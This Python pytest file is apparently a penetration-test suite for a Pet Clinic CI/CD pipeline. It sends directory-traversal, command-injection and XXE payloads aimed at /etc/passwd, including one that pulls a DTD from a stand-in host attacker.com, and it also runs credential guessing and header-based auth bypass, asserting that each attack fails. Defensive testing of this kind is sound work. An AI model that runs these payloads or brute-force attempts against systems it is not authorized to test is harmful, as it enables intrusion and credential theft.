#!/usr/bin/env python3
"""
Penetration Testing Suite for Pet Clinic CI/CD Pipeline

This suite performs targeted penetration testing to identify security vulnerabilities
through simulated attack scenarios.

Validates: Requirements 10.1, 10.2, 10.3, 10.4
"""

import pytest
import requests
import socket
import threading
import time
import json
import os
import subprocess
import base64
import hashlib
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse, urljoin
import uuid
from datetime import datetime
import random
import string


class PenetrationTestingSuite:
    """Comprehensive penetration testing suite"""
    
    def __init__(self):
        # Target applications
        self.jenkins_url = os.getenv('JENKINS_URL', 'http://localhost:8080')
        self.frontend_url = os.getenv('FRONTEND_URL', 'http://localhost:8080')
        self.backend_url = os.getenv('BACKEND_URL', 'http://localhost:8081')
        
        # Test credentials
        self.jenkins_user = os.getenv('JENKINS_USER', 'admin')
        self.jenkins_token = os.getenv('JENKINS_TOKEN', '')
        
        # Attack payloads and patterns
        self.directory_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd'
        ]
        
        self.command_injection_payloads = [
            '; ls -la',
            '| whoami',
            '`id`',
            '$(whoami)',
            '; cat /etc/passwd',
            '&& dir',
            '|| echo vulnerable'
        ]
        
        self.xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>
<root>&xxe;</root>'''
        ]
        
        self.csrf_test_forms = [
            '/owners/new',
            '/pets/new',
            '/visits/new'
        ]
        
        # Brute force patterns
        self.common_passwords = [
            'admin', 'password', '123456', 'admin123', 'root', 'jenkins',
            'petclinic', 'test', 'demo', 'changeme', 'default'
        ]
        
        self.common_usernames = [
            'admin', 'administrator', 'root', 'jenkins', 'user', 'test',
            'demo', 'guest', 'petclinic', 'manager'
        ]
    
    def setup_test_environment(self) -> Dict[str, Any]:
        """Set up penetration testing environment"""
        test_id = str(uuid.uuid4())[:8]
        timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
        
        return {
            'test_id': test_id,
            'timestamp': timestamp,
            'attack_results': {},
            'vulnerabilities_found': [],
            'successful_attacks': 0,
            'total_attacks': 0
        }
    
    def test_authentication_bypass(self, test_env: Dict[str, Any]) -> Dict[str, Any]:
        """Test for authentication bypass vulnerabilities"""
        bypass_results = {
            'tests_performed': 0,
            'bypasses_found': 0,
            'findings': []
        }
        
        print("Testing authentication bypass techniques...")
        
        # Test 1: Direct URL access to protected resources
        protected_urls = [
            f'{self.jenkins_url}/manage',
            f'{self.jenkins_url}/configure',
            f'{self.frontend_url}/owners',
            f'{self.frontend_url}/admin',
            f'{self.backend_url}/actuator/env',
            f'{self.backend_url}/actuator/configprops'
        ]
        
        for url in protected_urls:
            bypass_results['tests_performed'] += 1
            test_env['total_attacks'] += 1
            
            try:
                response = requests.get(url, timeout=10, allow_redirects=False)
                
                if response.status_code == 200:
                    bypass_results['bypasses_found'] += 1
                    test_env['successful_attacks'] += 1
                    bypass_results['findings'].append(f"🚨 Direct access to protected resource: {url}")
                    test_env['vulnerabilities_found'].append(f"Authentication bypass: {url}")
                elif response.status_code in [401, 403]:
                    bypass_results['findings'].append(f"✓ Protected resource properly secured: {url}")
                elif response.status_code == 302:
                    location = response.headers.get('Location', '')
                    if 'login' in location.lower():
                        bypass_results['findings'].append(f"✓ Redirect to login for: {url}")
                    else:
                        bypass_results['findings'].append(f"⚠ Unexpected redirect for: {url}")
            
            except Exception as e:
                bypass_results['findings'].append(f"Error testing {url}: {e}")
        
        # Test 2: HTTP method bypass
        for url in protected_urls[:3]:  # Test first 3 URLs
            bypass_results['tests_performed'] += 1
            test_env['total_attacks'] += 1
            
            try:
                # Try different HTTP methods
                for method in ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']:
                    response = requests.request(method, url, timeout=5)
                    
                    if response.status_code == 200 and method != 'HEAD':
                        bypass_results['bypasses_found'] += 1
                        test_env['successful_attacks'] += 1
                        bypass_results['findings'].append(f"🚨 HTTP method bypass with {method}: {url}")
                        test_env['vulnerabilities_found'].append(f"HTTP method bypass: {method} {url}")
                        break
            
            except Exception as e:
                bypass_results['findings'].append(f"Error testing HTTP methods on {url}: {e}")
        
        # Test 3: Header manipulation
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'Host': 'localhost'},
            {'X-Override-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'}
        ]
        
        for url in protected_urls[:2]:  # Test first 2 URLs
            for headers in bypass_headers:
                bypass_results['tests_performed'] += 1
                test_env['total_attacks'] += 1
                
                try:
                    response = requests.get(url, headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        bypass_results['bypasses_found'] += 1
                        test_env['successful_attacks'] += 1
                        bypass_results['findings'].append(f"🚨 Header bypass with {headers}: {url}")
                        test_env['vulnerabilities_found'].append(f"Header bypass: {url}")
                        break
                
                except Exception as e:
                    continue  # Ignore individual header test errors
        
        return bypass_results
    
    def test_brute_force_attacks(self, test_env: Dict[str, Any]) -> Dict[str, Any]:
        """Test brute force attack resistance"""
        brute_force_results = {
            'login_attempts': 0,
            'successful_logins': 0,
            'rate_limiting_detected': False,
            'account_lockout_detected': False,
            'findings': []
        }
        
        print("Testing brute force attack resistance...")
        
        # Test Jenkins brute force protection
        jenkins_login_url = f'{self.jenkins_url}/j_acegi_security_check'
        
        # Perform limited brute force test (5 attempts to avoid lockout)
        for i, password in enumerate(self.common_passwords[:5]):
            brute_force_results['login_attempts'] += 1
            test_env['total_attacks'] += 1
            
            try:
                login_data = {
                    'j_username': 'admin',
                    'j_password': password,
                    'from': '/',
                    'Submit': 'Sign in'
                }
                
                start_time = time.time()
                response = requests.post(jenkins_login_url, data=login_data, timeout=10, allow_redirects=False)
                response_time = time.time() - start_time
                
                # Check for successful login
                if response.status_code == 302 and 'loginError' not in response.headers.get('Location', ''):
                    brute_force_results['successful_logins'] += 1
                    test_env['successful_attacks'] += 1
                    brute_force_results['findings'].append(f"🚨 Successful brute force login with password: {password}")
                    test_env['vulnerabilities_found'].append(f"Weak credentials: admin/{password}")
                    break
                
                # Check for rate limiting (slow response)
                if response_time > 2.0:
                    brute_force_results['rate_limiting_detected'] = True
                    brute_force_results['findings'].append("✓ Rate limiting detected (slow response)")
                
                # Check for account lockout
                if 'locked' in response.text.lower() or 'blocked' in response.text.lower():
                    brute_force_results['account_lockout_detected'] = True
                    brute_force_results['findings'].append("✓ Account lockout mechanism detected")
                    break
                
                # Small delay between attempts
                time.sleep(1)
            
            except Exception as e:
                brute_force_results['findings'].append(f"Error in brute force test: {e}")
        
        # Test frontend brute force protection
        frontend_login_url = f'{self.frontend_url}/login'
        
        try:
            # Get login form first
            login_page = requests.get(frontend_login_url, timeout=10)
            
            if login_page.status_code == 200:
                # Perform a few login attempts
                for username in self.common_usernames[:3]:
                    for password in self.common_passwords[:3]:
                        brute_force_results['login_attempts'] += 1
                        test_env['total_attacks'] += 1
                        
                        login_data = {
                            'username': username,
                            'password': password
                        }
                        
                        response = requests.post(frontend_login_url, data=login_data, timeout=5)
                        
                        # Check for successful login (redirect or success page)
                        if response.status_code == 302 and 'error' not in response.headers.get('Location', ''):
                            brute_force_results['successful_logins'] += 1
                            test_env['successful_attacks'] += 1
                            brute_force_results['findings'].append(f"🚨 Frontend login bypass: {username}/{password}")
                            test_env['vulnerabilities_found'].append(f"Weak frontend credentials: {username}/{password}")
                        
                        time.sleep(0.5)  # Small delay
        
        except Exception as e:
            brute_force_results['findings'].append(f"Error testing frontend brute force: {e}")
        
        # Evaluate brute force protection
        if brute_force_results['successful_logins'] == 0:
            brute_force_results['findings'].append("✓ No successful brute force attacks")
        
        if not brute_force_results['rate_limiting_detected'] and not brute_force_results['account_lockout_detected']:
            brute_force_results['findings'].append("⚠ No brute force protection mechanisms detected")
        
        return brute_force_results
    
    def test_injection_attacks(self, test_env: Dict[str, Any]) -> Dict[str, Any]:
        """Test various injection attack vectors"""
        injection_results = {
            'directory_traversal_tests': 0,
            'directory_traversal_vulns': 0,
            'command_injection_tests': 0,
            'command_injection_vulns': 0,
            'xxe_tests': 0,
            'xxe_vulns': 0,
            'findings': []
        }
        
        print("Testing injection attack vectors...")
        
        # Test directory traversal
        traversal_endpoints = [
            f'{self.jenkins_url}/userContent/',
            f'{self.frontend_url}/static/',
            f'{self.backend_url}/api/files/',
            f'{self.backend_url}/download'
        ]
        
        for endpoint in traversal_endpoints:
            for payload in self.directory_traversal_payloads:
                injection_results['directory_traversal_tests'] += 1
                test_env['total_attacks'] += 1
                
                try:
                    # Test as URL parameter
                    response = requests.get(f'{endpoint}?file={payload}', timeout=10)
                    
                    # Look for signs of successful traversal
                    if response.status_code == 200:
                        content = response.text.lower()
                        if any(indicator in content for indicator in ['root:', 'bin/bash', '[boot loader]', 'windows']):
                            injection_results['directory_traversal_vulns'] += 1
                            test_env['successful_attacks'] += 1
                            injection_results['findings'].append(f"🚨 Directory traversal vulnerability: {endpoint}")
                            test_env['vulnerabilities_found'].append(f"Directory traversal: {endpoint}")
                            break
                    
                    # Test as path parameter
                    response = requests.get(f'{endpoint}{payload}', timeout=5)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        if any(indicator in content for indicator in ['root:', 'bin/bash', '[boot loader]']):
                            injection_results['directory_traversal_vulns'] += 1
                            test_env['successful_attacks'] += 1
                            injection_results['findings'].append(f"🚨 Path traversal vulnerability: {endpoint}")
                            test_env['vulnerabilities_found'].append(f"Path traversal: {endpoint}")
                            break
                
                except Exception as e:
                    continue  # Ignore individual test errors
        
        # Test command injection
        command_endpoints = [
            f'{self.jenkins_url}/script',
            f'{self.backend_url}/api/system/command',
            f'{self.backend_url}/api/admin/execute'
        ]
        
        for endpoint in command_endpoints:
            for payload in self.command_injection_payloads:
                injection_results['command_injection_tests'] += 1
                test_env['total_attacks'] += 1
                
                try:
                    # Test POST data injection
                    response = requests.post(
                        endpoint,
                        data={'command': f'echo test{payload}', 'script': f'print("test"){payload}'},
                        timeout=10
                    )
                    
                    if response.status_code == 200:
                        content = response.text
                        # Look for command execution indicators
                        if any(indicator in content for indicator in ['uid=', 'gid=', 'root', 'administrator']):
                            injection_results['command_injection_vulns'] += 1
                            test_env['successful_attacks'] += 1
                            injection_results['findings'].append(f"🚨 Command injection vulnerability: {endpoint}")
                            test_env['vulnerabilities_found'].append(f"Command injection: {endpoint}")
                            break
                
                except Exception as e:
                    continue  # Ignore individual test errors
        
        # Test XXE injection
        xxe_endpoints = [
            f'{self.backend_url}/api/import',
            f'{self.backend_url}/api/upload',
            f'{self.frontend_url}/upload'
        ]
        
        for endpoint in xxe_endpoints:
            for payload in self.xxe_payloads:
                injection_results['xxe_tests'] += 1
                test_env['total_attacks'] += 1
                
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = requests.post(endpoint, data=payload, headers=headers, timeout=10)
                    
                    if response.status_code == 200:
                        content = response.text
                        # Look for XXE indicators
                        if any(indicator in content for indicator in ['root:', '/etc/passwd', 'bin/bash']):
                            injection_results['xxe_vulns'] += 1
                            test_env['successful_attacks'] += 1
                            injection_results['findings'].append(f"🚨 XXE vulnerability: {endpoint}")
                            test_env['vulnerabilities_found'].append(f"XXE injection: {endpoint}")
                            break
                
                except Exception as e:
                    continue  # Ignore individual test errors
        
        # Summary findings
        total_injection_vulns = (injection_results['directory_traversal_vulns'] + 
                               injection_results['command_injection_vulns'] + 
                               injection_results['xxe_vulns'])
        
        if total_injection_vulns == 0:
            injection_results['findings'].append("✓ No injection vulnerabilities detected")
        
        return injection_results
    
    def test_csrf_protection(self, test_env: Dict[str, Any]) -> Dict[str, Any]:
        """Test Cross-Site Request Forgery protection"""
        csrf_results = {
            'forms_tested': 0,
            'csrf_vulns': 0,
            'findings': []
        }
        
        print("Testing CSRF protection...")
        
        # Test CSRF protection on forms
        for form_path in self.csrf_test_forms:
            csrf_results['forms_tested'] += 1
            test_env['total_attacks'] += 1
            
            try:
                form_url = f'{self.frontend_url}{form_path}'
                
                # Get the form page
                form_response = requests.get(form_url, timeout=10)
                
                if form_response.status_code == 200:
                    form_content = form_response.text
                    
                    # Check for CSRF token in form
                    has_csrf_token = any(token_indicator in form_content.lower() for token_indicator in [
                        'csrf', '_token', 'authenticity_token', 'csrfmiddlewaretoken'
                    ])
                    
                    if not has_csrf_token:
                        # Try to submit form without CSRF token
                        form_data = {
                            'firstName': 'TestCSRF',
                            'lastName': 'Attack',
                            'name': 'CSRFTest'
                        }
                        
                        submit_response = requests.post(form_url, data=form_data, timeout=10)
                        
                        if submit_response.status_code in [200, 302] and 'error' not in submit_response.text.lower():
                            csrf_results['csrf_vulns'] += 1
                            test_env['successful_attacks'] += 1
                            csrf_results['findings'].append(f"🚨 CSRF vulnerability in form: {form_path}")
                            test_env['vulnerabilities_found'].append(f"CSRF vulnerability: {form_path}")
                        else:
                            csrf_results['findings'].append(f"✓ Form submission rejected without CSRF token: {form_path}")
                    else:
                        csrf_results['findings'].append(f"✓ CSRF token found in form: {form_path}")
            
            except Exception as e:
                csrf_results['findings'].append(f"Error testing CSRF on {form_path}: {e}")
        
        # Test CSRF on API endpoints
        api_endpoints = [
            f'{self.backend_url}/api/owners',
            f'{self.backend_url}/api/pets',
            f'{self.backend_url}/api/visits'
        ]
        
        for endpoint in api_endpoints:
            csrf_results['forms_tested'] += 1
            test_env['total_attacks'] += 1
            
            try:
                # Try to create resource without CSRF protection
                test_data = {
                    'name': 'CSRFTest',
                    'description': 'CSRF attack test'
                }
                
                response = requests.post(endpoint, json=test_data, timeout=10)
                
                if response.status_code in [200, 201]:
                    csrf_results['csrf_vulns'] += 1
                    test_env['successful_attacks'] += 1
                    csrf_results['findings'].append(f"🚨 API endpoint vulnerable to CSRF: {endpoint}")
                    test_env['vulnerabilities_found'].append(f"API CSRF vulnerability: {endpoint}")
                elif response.status_code in [401, 403]:
                    csrf_results['findings'].append(f"✓ API endpoint protected: {endpoint}")
            
            except Exception as e:
                csrf_results['findings'].append(f"Error testing API CSRF on {endpoint}: {e}")
        
        if csrf_results['csrf_vulns'] == 0:
            csrf_results['findings'].append("✓ No CSRF vulnerabilities detected")
        
        return csrf_results
    
    def test_session_management(self, test_env: Dict[str, Any]) -> Dict[str, Any]:
        """Test session management security"""
        session_results = {
            'session_tests': 0,
            'session_vulns': 0,
            'findings': []
        }
        
        print("Testing session management...")
        
        # Test session fixation
        session_results['session_tests'] += 1
        test_env['total_attacks'] += 1
        
        try:
            session = requests.Session()
            
            # Get initial session
            initial_response = session.get(f'{self.frontend_url}/', timeout=10)
            initial_cookies = session.cookies.get_dict()
            
            # Attempt login (if login page exists)
            login_response = session.get(f'{self.frontend_url}/login', timeout=10)
            
            if login_response.status_code == 200:
                # Check if session ID changed after login attempt
                post_login_cookies = session.cookies.get_dict()
                
                session_id_changed = False
                for cookie_name in initial_cookies:
                    if (cookie_name in post_login_cookies and 
                        initial_cookies[cookie_name] != post_login_cookies[cookie_name]):
                        session_id_changed = True
                        break
                
                if not session_id_changed:
                    session_results['session_vulns'] += 1
                    test_env['successful_attacks'] += 1
                    session_results['findings'].append("🚨 Session fixation vulnerability detected")
                    test_env['vulnerabilities_found'].append("Session fixation vulnerability")
                else:
                    session_results['findings'].append("✓ Session ID changes after login")
        
        except Exception as e:
            session_results['findings'].append(f"Error testing session fixation: {e}")
        
        # Test session timeout
        session_results['session_tests'] += 1
        test_env['total_attacks'] += 1
        
        try:
            # Create a session and check if it times out appropriately
            test_session = requests.Session()
            
            # Make initial request
            initial_response = test_session.get(f'{self.frontend_url}/', timeout=10)
            
            if initial_response.status_code == 200:
                # Check cookie attributes
                set_cookie_header = initial_response.headers.get('Set-Cookie', '')
                
                if 'HttpOnly' not in set_cookie_header:
                    session_results['session_vulns'] += 1
                    session_results['findings'].append("⚠ Session cookies missing HttpOnly flag")
                else:
                    session_results['findings'].append("✓ Session cookies have HttpOnly flag")
                
                if 'Secure' not in set_cookie_header and initial_response.url.startswith('https'):
                    session_results['session_vulns'] += 1
                    session_results['findings'].append("⚠ HTTPS session cookies missing Secure flag")
                elif 'Secure' in set_cookie_header:
                    session_results['findings'].append("✓ Session cookies have Secure flag")
        
        except Exception as e:
            session_results['findings'].append(f"Error testing session security: {e}")
        
        if session_results['session_vulns'] == 0:
            session_results['findings'].append("✓ No session management vulnerabilities detected")
        
        return session_results
    
    def generate_penetration_test_report(self, test_env: Dict[str, Any], all_results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate comprehensive penetration test report"""
        report = {
            'executive_summary': {
                'test_id': test_env['test_id'],
                'timestamp': test_env['timestamp'],
                'total_attacks_attempted': test_env['total_attacks'],
                'successful_attacks': test_env['successful_attacks'],
                'vulnerabilities_found': len(test_env['vulnerabilities_found']),
                'attack_success_rate': test_env['successful_attacks'] / max(test_env['total_attacks'], 1)
            },
            'vulnerability_breakdown': {},
            'critical_vulnerabilities': test_env['vulnerabilities_found'],
            'security_recommendations': [],
            'risk_assessment': 'LOW'
        }
        
        # Calculate vulnerability breakdown
        for category, results in all_results.items():
            if isinstance(results, dict):
                vuln_count = 0
                
                # Count vulnerabilities by category
                if 'bypasses_found' in results:
                    vuln_count += results['bypasses_found']
                if 'successful_logins' in results:
                    vuln_count += results['successful_logins']
                if 'directory_traversal_vulns' in results:
                    vuln_count += results['directory_traversal_vulns']
                if 'command_injection_vulns' in results:
                    vuln_count += results['command_injection_vulns']
                if 'xxe_vulns' in results:
                    vuln_count += results['xxe_vulns']
                if 'csrf_vulns' in results:
                    vuln_count += results['csrf_vulns']
                if 'session_vulns' in results:
                    vuln_count += results['session_vulns']
                
                report['vulnerability_breakdown'][category] = vuln_count
        
        # Generate security recommendations
        total_vulns = sum(report['vulnerability_breakdown'].values())
        
        if total_vulns > 0:
            report['security_recommendations'].append("Implement comprehensive input validation and sanitization")
            report['security_recommendations'].append("Strengthen authentication and authorization mechanisms")
            report['security_recommendations'].append("Implement proper session management controls")
            report['security_recommendations'].append("Add CSRF protection to all state-changing operations")
            report['security_recommendations'].append("Regular security testing and code review processes")
        
        # Assess risk level
        if total_vulns == 0:
            report['risk_assessment'] = 'LOW'
        elif total_vulns <= 2:
            report['risk_assessment'] = 'MEDIUM'
        else:
            report['risk_assessment'] = 'HIGH'
        
        return report


@pytest.fixture
def pentest_suite():
    """Fixture for penetration testing suite"""
    return PenetrationTestingSuite()


def test_comprehensive_penetration_testing(pentest_suite):
    """
    Comprehensive penetration testing of the Pet Clinic CI/CD Pipeline
    
    This test performs simulated attacks to identify security vulnerabilities:
    - Authentication bypass attempts
    - Brute force attacks
    - Injection attacks (SQL, XSS, Command, XXE, Directory Traversal)
    - CSRF attacks
    - Session management attacks
    
    Validates: Requirements 10.1, 10.2, 10.3, 10.4
    """
    # Set up test environment
    test_env = pentest_suite.setup_test_environment()
    print(f"Starting comprehensive penetration testing {test_env['test_id']}")
    
    all_results = {}
    
    try:
        # Attack 1: Authentication bypass
        print("\n=== Testing Authentication Bypass ===")
        bypass_results = pentest_suite.test_authentication_bypass(test_env)
        all_results['authentication_bypass'] = bypass_results
        
        # Assert no authentication bypasses
        assert bypass_results['bypasses_found'] == 0, (
            f"Authentication bypass vulnerabilities found: {bypass_results['bypasses_found']}. "
            f"Successful bypasses detected."
        )
        
        print(f"Authentication bypass tests: {bypass_results['tests_performed']} performed, {bypass_results['bypasses_found']} vulnerabilities")
        
        # Attack 2: Brute force attacks
        print("\n=== Testing Brute Force Resistance ===")
        brute_force_results = pentest_suite.test_brute_force_attacks(test_env)
        all_results['brute_force'] = brute_force_results
        
        # Assert no successful brute force attacks
        assert brute_force_results['successful_logins'] == 0, (
            f"Brute force attacks succeeded: {brute_force_results['successful_logins']} successful logins. "
            f"Weak credentials detected."
        )
        
        print(f"Brute force tests: {brute_force_results['login_attempts']} attempts, {brute_force_results['successful_logins']} successful")
        
        # Attack 3: Injection attacks
        print("\n=== Testing Injection Attacks ===")
        injection_results = pentest_suite.test_injection_attacks(test_env)
        all_results['injection_attacks'] = injection_results
        
        # Assert no injection vulnerabilities
        total_injection_vulns = (injection_results.get('directory_traversal_vulns', 0) + 
                               injection_results.get('command_injection_vulns', 0) + 
                               injection_results.get('xxe_vulns', 0))
        
        assert total_injection_vulns == 0, (
            f"Injection vulnerabilities found: {total_injection_vulns}. "
            f"Directory traversal: {injection_results.get('directory_traversal_vulns', 0)}, "
            f"Command injection: {injection_results.get('command_injection_vulns', 0)}, "
            f"XXE: {injection_results.get('xxe_vulns', 0)}"
        )
        
        print(f"Injection tests: {injection_results.get('directory_traversal_tests', 0)} traversal, "
              f"{injection_results.get('command_injection_tests', 0)} command, "
              f"{injection_results.get('xxe_tests', 0)} XXE")
        
        # Attack 4: CSRF attacks
        print("\n=== Testing CSRF Protection ===")
        csrf_results = pentest_suite.test_csrf_protection(test_env)
        all_results['csrf_attacks'] = csrf_results
        
        # Assert CSRF protection (allow some flexibility for test environment)
        assert csrf_results['csrf_vulns'] <= 1, (
            f"Multiple CSRF vulnerabilities found: {csrf_results['csrf_vulns']}. "
            f"CSRF protection insufficient."
        )
        
        print(f"CSRF tests: {csrf_results['forms_tested']} forms tested, {csrf_results['csrf_vulns']} vulnerabilities")
        
        # Attack 5: Session management
        print("\n=== Testing Session Management ===")
        session_results = pentest_suite.test_session_management(test_env)
        all_results['session_attacks'] = session_results
        
        # Assert session security (allow some flexibility)
        assert session_results['session_vulns'] <= 1, (
            f"Session management vulnerabilities found: {session_results['session_vulns']}"
        )
        
        print(f"Session tests: {session_results['session_tests']} performed, {session_results['session_vulns']} vulnerabilities")
        
        # Generate comprehensive penetration test report
        print("\n=== Generating Penetration Test Report ===")
        pentest_report = pentest_suite.generate_penetration_test_report(test_env, all_results)
        
        # Assert overall security posture
        attack_success_rate = pentest_report['executive_summary']['attack_success_rate']
        assert attack_success_rate <= 0.05, (  # Allow up to 5% attack success rate
            f"Attack success rate too high: {attack_success_rate:.2%}. "
            f"Successful attacks: {pentest_report['executive_summary']['successful_attacks']}"
        )
        
        total_vulnerabilities = pentest_report['executive_summary']['vulnerabilities_found']
        assert total_vulnerabilities <= 2, (  # Allow up to 2 minor vulnerabilities
            f"Too many vulnerabilities found: {total_vulnerabilities}. "
            f"Critical vulnerabilities: {pentest_report['critical_vulnerabilities']}"
        )
        
        # Log penetration test results
        print(f"\n✓ Comprehensive penetration testing completed")
        print(f"  - Total attacks attempted: {pentest_report['executive_summary']['total_attacks_attempted']}")
        print(f"  - Successful attacks: {pentest_report['executive_summary']['successful_attacks']}")
        print(f"  - Attack success rate: {attack_success_rate:.2%}")
        print(f"  - Vulnerabilities found: {total_vulnerabilities}")
        print(f"  - Risk assessment: {pentest_report['risk_assessment']}")
        
        # Log vulnerability breakdown
        print(f"  - Vulnerability breakdown:")
        for category, count in pentest_report['vulnerability_breakdown'].items():
            print(f"    • {category}: {count}")
        
        # Log recommendations if any
        if pentest_report['security_recommendations']:
            print(f"  - Security recommendations: {len(pentest_report['security_recommendations'])}")
            for rec in pentest_report['security_recommendations'][:3]:  # Show first 3
                print(f"    • {rec}")
        
        # Final assertion on critical vulnerabilities
        assert pentest_report['risk_assessment'] in ['LOW', 'MEDIUM'], (
            f"High risk assessment due to critical vulnerabilities: {pentest_report['critical_vulnerabilities']}"
        )
        
    except Exception as e:
        print(f"Penetration testing error: {e}")
        raise


def test_focused_authentication_attacks():
    """
    Focused penetration test for authentication mechanisms
    Validates: Requirements 10.1, 10.2
    """
    test_instance = PenetrationTestingSuite()
    test_env = test_instance.setup_test_environment()
    
    # Test authentication bypass
    bypass_results = test_instance.test_authentication_bypass(test_env)
    
    # Test brute force
    brute_force_results = test_instance.test_brute_force_attacks(test_env)
    
    print("Authentication attack results:")
    print(f"  - Bypass attempts: {bypass_results['tests_performed']}")
    print(f"  - Bypasses found: {bypass_results['bypasses_found']}")
    print(f"  - Brute force attempts: {brute_force_results['login_attempts']}")
    print(f"  - Successful logins: {brute_force_results['successful_logins']}")
    
    # Assert authentication security
    assert bypass_results['bypasses_found'] == 0, "Authentication bypass vulnerabilities found"
    assert brute_force_results['successful_logins'] == 0, "Brute force attacks succeeded"
    
    # Check for protection mechanisms
    protection_detected = (brute_force_results['rate_limiting_detected'] or 
                         brute_force_results['account_lockout_detected'])
    
    if brute_force_results['login_attempts'] > 0:
        assert protection_detected, "No brute force protection mechanisms detected"
    
    print(f"\n✓ Authentication attack testing completed")
    print(f"  - No authentication bypasses found")
    print(f"  - No successful brute force attacks")
    print(f"  - Protection mechanisms: {'✓' if protection_detected else '✗'}")


if __name__ == '__main__':
    # Run the tests
    import sys
    pytest.main([sys.argv[0], '-v', '--tb=short'])